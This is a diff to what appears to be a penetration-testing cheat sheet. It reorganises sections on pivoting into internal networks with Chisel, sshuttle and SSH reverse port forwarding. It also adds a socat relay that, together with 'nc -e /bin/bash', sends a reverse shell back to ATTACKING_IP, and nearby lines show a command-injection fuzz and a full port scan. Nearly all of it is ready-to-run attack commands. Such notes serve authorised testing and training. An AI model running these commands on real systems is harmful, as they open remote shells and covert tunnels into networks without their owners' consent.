@@ -18,7 +18,8 @@ wfuzz -u <http://example.com/?FUZZ=ls+-la> -w <wordlist> --hw 2
 ```bash
 nc -zv <IP> 1-65535
 ```
-# Chisel (Reverse Connection):
+# Internal Network Acess (Reverse Port Forwarding)
+- #### Chisel (Reverse Connection):
 > Make sure to add `socks5	127.0.0.1 1080` in **/etc/proxychains4.conf** file.
 - On the local machine:
 ```bash
@@ -28,11 +29,12 @@ nc -zv <IP> 1-65535
 ```bash
 ./chisel client <LHOST>:8000 R:socks
 ```
-# Internal Network access using SShuttle:
+- #### Internal Network access using SShuttle:
 ```bash
 └─$ sshuttle -r <username>@<RHOST> <Internal IP/Subnet>
 ```
-# Reverse Port forward using OpenSSH
+
+- #### Reverse Port forward using OpenSSH
 ```powershell
 ssh-keygen  # Generate key
 ```
@@ -47,6 +49,14 @@ ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
 OR
 
 ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
+```
+- #### Reverse Shell Relay using Socat
+```powershell
+sudo nc -lvnp 443    # On Attacking Machine
+
+./socat tcp-l:8000 tcp:ATTACKING_IP:443 &    # On Target Machine
+
+nc 127.0.0.1 8000 -e /bin/bash    # On Target Machine
 ```
 
 # Windows Enumeration using SEATBELT
